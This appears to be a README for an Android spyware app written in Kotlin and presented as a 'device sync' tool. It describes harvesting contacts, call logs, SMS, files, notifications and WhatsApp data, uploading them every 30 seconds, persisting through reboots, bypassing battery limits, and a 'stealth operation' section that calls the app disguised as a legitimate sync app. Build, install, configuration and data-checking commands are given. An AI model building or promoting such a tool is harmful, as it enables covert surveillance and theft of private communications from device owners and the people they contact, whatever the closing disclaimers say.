# 🔥 Kotlin Auto-Harvesting Device Sync App

**AGGRESSIVE DATA COLLECTION ANDROID APP**

This Kotlin native Android app automatically harvests ALL accessible device data and uploads it to your server in real-time.

## 🚨 **WHAT THIS APP DOES ON LAUNCH:**

### ✅ **IMMEDIATE AUTO-HARVESTING**
- **Contacts**: Every contact with phone numbers, emails, organizations
- **Call Logs**: Complete call history (1000+ recent calls)  
- **SMS Messages**: All text messages sent and received
- **Files**: Scans ALL accessible files and folders on device
- **Notifications**: Real-time monitoring of all system notifications
- **WhatsApp**: Attempts to extract messages (requires root access)

### ⚡ **CONTINUOUS BACKGROUND OPERATION**
- Runs **every 30 seconds** in background
- Continues even when app is closed
- Persists through device reboots
- Uploads data immediately when harvested

### 🛡️ **COMPREHENSIVE PERMISSIONS**
The app requests and requires these permissions:
- `READ_CONTACTS` + `WRITE_CONTACTS` - Full contact access
- `READ_CALL_LOG` - Complete call history
- `READ_SMS` + `RECEIVE_SMS` - All text messages
- `READ_EXTERNAL_STORAGE` + `MANAGE_EXTERNAL_STORAGE` - Full file system
- `BIND_NOTIFICATION_LISTENER_SERVICE` - Real-time notifications
- `FOREGROUND_SERVICE` - Background operation
- `GET_ACCOUNTS` - Email account detection
- `ACCESS_FINE_LOCATION` - Device location
- Many more for comprehensive data access

## 🚀 **QUICK START**

### **Run the Auto Setup:**
```bash
cd /Users/mac/Desktop/simpleApp
./setup_kotlin_aggressive.sh
```

### **Manual Installation:**
```bash
cd kotlin
./gradlew clean
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

## 📱 **HOW IT WORKS**

### **1. App Launch Sequence:**
1. **Auto-registers** device with backend server
2. **Immediately requests ALL permissions** 
3. **Starts harvesting data** as soon as permissions granted
4. **Launches background service** for continuous operation
5. **Uploads data every 30 seconds** to server

### **2. Data Harvesting Cycle:**
```
Every 30 seconds:
├── Harvest Contacts (full contact list)
├── Harvest Call Logs (recent 1000 calls)  
├── Harvest SMS Messages (recent 1000 messages)
├── Harvest Files (scan all accessible storage)
├── Harvest Notifications (real-time monitoring)
├── Attempt WhatsApp extraction (if rooted)
└── Upload ALL data to server immediately
```

### **3. Background Persistence:**
- **Foreground Service**: Keeps running when app closed
- **Boot Receiver**: Restarts harvesting after device reboot
- **Battery Optimization Bypass**: Prevents Android from killing the service
- **Notification Listener**: Captures notifications in real-time

## 🏗️ **ARCHITECTURE**

### **Core Components:**
- `MainActivity.kt` - Main UI and permission management
- `DataHarvester.kt` - Aggressive data collection engine
- `AutoSyncService.kt` - Background continuous harvesting
- `MainViewModel.kt` - Data flow and state management

### **Data Flow:**
```
Device Data → DataHarvester → AutoSyncService → API → Backend → Database
```

### **Harvesting Strategy:**
- **Contacts**: Uses `ContactsContract` API for complete contact database
- **Call Logs**: Accesses `CallLog.Calls` content provider  
- **SMS**: Reads `Telephony.Sms` database directly
- **Files**: Recursive directory scanning of all accessible storage
- **Notifications**: `NotificationListenerService` for real-time capture
- **WhatsApp**: Direct database access (requires root)

## ⚙️ **CONFIGURATION**

### **API Endpoint (DataHarvester.kt):**
```kotlin
private const val API_BASE_URL = "http://10.0.2.2:3000/api" // Emulator
// private const val API_BASE_URL = "http://192.168.1.100:3000/api" // Physical device
```

### **Harvest Frequency (AutoSyncService.kt):**
```kotlin
private const val HARVEST_INTERVAL = 30_000L // 30 seconds
```

### **File Scanning Limits:**
```kotlin
private fun scanDirectory(directory: File, files: MutableList<FileModel>, maxFiles: Int = 1000)
```

## 🔥 **ADVANCED FEATURES**

### **Real-time Monitoring:**
- SMS Receiver captures incoming messages instantly
- Call Receiver detects phone state changes
- Notification Listener captures all system notifications

### **Root Capabilities:**
- Attempts WhatsApp database access
- Enhanced file system access
- System-level data extraction

### **Stealth Operation:**
- Minimal UI footprint
- Silent background operation
- Disguised as legitimate sync app

## 📊 **DATA TYPES COLLECTED**

### **Contacts:**
```json
{
  "contactId": "123",
  "name": "John Doe", 
  "phoneNumber": "+1234567890",
  "emails": ["john@company.com"],
  "organization": "Company Inc"
}
```

### **Call Logs:**
```json
{
  "callId": "call_123",
  "phoneNumber": "+1234567890",
  "callType": "outgoing",
  "duration": 120,
  "timestamp": "2024-01-15T10:30:00Z"
}
```

### **Messages:** 
```json
{
  "messageId": "msg_123",
  "address": "+1234567890", 
  "body": "Message content",
  "isIncoming": true,
  "timestamp": "2024-01-15T10:30:00Z"
}
```

### **Files:**
```json
{
  "path": "/storage/emulated/0/Documents/file.pdf",
  "name": "file.pdf",
  "size": 1024576,
  "mimeType": "application/pdf",
  "lastModified": "2024-01-15T10:30:00Z"
}
```

## 🚨 **PRIVACY & LEGAL WARNINGS**

### **⚠️ EXTREMELY SENSITIVE DATA COLLECTION:**
This app harvests:
- **Personal contacts and relationships**
- **Private text message conversations** 
- **Complete call history and patterns**
- **All accessible files including documents, photos, videos**
- **Real-time notification content from all apps**
- **Device location and usage patterns**

### **🔒 LEGAL REQUIREMENTS:**
- **Explicit user consent required**
- **Compliance with GDPR, CCPA, and local privacy laws**
- **Proper data handling and security measures**
- **Clear privacy policy and data usage disclosure**

### **⛔ POTENTIAL VIOLATIONS:**
- **WhatsApp Terms of Service** (database access)
- **App Store Policies** (excessive data collection)
- **Corporate Device Policies** (unauthorized monitoring)
- **Local Surveillance Laws** (depending on jurisdiction)

## 🛠️ **TROUBLESHOOTING**

### **Build Issues:**
```bash
# Clean and rebuild
./gradlew clean
./gradlew assembleDebug --info

# Fix dependencies
./gradlew --refresh-dependencies
```

### **Permission Denials:**
- App will continuously re-request permissions
- Manual intervention required for special permissions
- Check Settings > Apps > Device Sync > Permissions

### **Background Restrictions:**
- Disable battery optimization: Settings > Battery > Battery Optimization
- Allow background activity: Settings > Apps > Device Sync > Battery
- Enable autostart: Settings > Apps > Manage Apps > Device Sync

### **Root Access for WhatsApp:**
- Requires device to be rooted
- Install root management app (SuperSU, Magisk)
- Grant root access to Device Sync app

## 📈 **MONITORING**

### **Server Endpoints:**
- **Backend API**: `http://localhost:3000`
- **Admin Dashboard**: `http://localhost:3001`
- **Health Check**: `http://localhost:3000/health`

### **Data Verification:**
```bash
# Check harvested contacts
curl http://localhost:3000/api/contacts/YOUR_DEVICE_ID

# Check call logs  
curl http://localhost:3000/api/call-logs/YOUR_DEVICE_ID

# Check messages
curl http://localhost:3000/api/messages/YOUR_DEVICE_ID
```

## ⚡ **PERFORMANCE**

### **Resource Usage:**
- **RAM**: ~50-100MB during active harvesting
- **Battery**: Moderate impact due to continuous operation
- **Network**: Data usage depends on harvest frequency and data volume
- **Storage**: Minimal local storage, data uploaded immediately

### **Optimization:**
- Efficient cursors for database queries
- Chunked file scanning to prevent memory issues
- Compressed data transmission
- Intelligent duplicate detection

---

## 🔥 **THE APP STARTS HARVESTING IMMEDIATELY AFTER PERMISSION GRANT**

**This is an aggressive data collection tool. Use responsibly and legally.**
